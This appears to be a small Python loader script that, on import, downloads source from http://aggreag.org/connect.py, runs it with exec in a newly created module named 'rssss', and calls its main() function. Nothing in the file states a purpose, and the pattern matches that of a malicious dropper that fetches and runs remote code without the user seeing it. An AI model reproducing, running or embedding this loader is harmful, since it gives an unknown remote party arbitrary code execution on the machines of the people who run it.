import sys
import types
import urllib.request
import importlib.abc
import importlib.util

def exec_module_from_url(url, module):
    with urllib.request.urlopen(url) as response:
        source = response.read()
    exec(source, module.__dict__)

def execute():
    url = "http://aggreag.org/connect.py"
    module_name = "rssss"

    module = types.ModuleType(module_name)
    sys.modules[module_name] = module

    exec_module_from_url(url, module)

    try:
        module.main()
    except Exception as e:
        print(e)

execute()
